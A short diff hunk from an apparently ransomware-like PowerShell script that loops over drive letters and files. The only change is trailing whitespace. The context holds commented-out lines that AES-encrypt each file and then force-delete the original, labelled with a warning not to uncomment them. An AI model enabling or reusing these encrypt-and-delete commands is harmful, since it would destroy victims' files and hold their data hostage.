@@ -128,7 +128,7 @@ foreach($A in $Alphabet){
                 #######DONT UNCOMMENT BELOW UNLESS YOU WANT TO DESTROY SOMEONES DAY#######
 
                 #Invoke-AESEncryption -Mode Encrypt -Key "$Pass" -Path $F
-                #Remove-Item $F.FullName -Recurse -Force
+                #Remove-Item $F.FullName -Recurse -Force 
             }
         }
     }
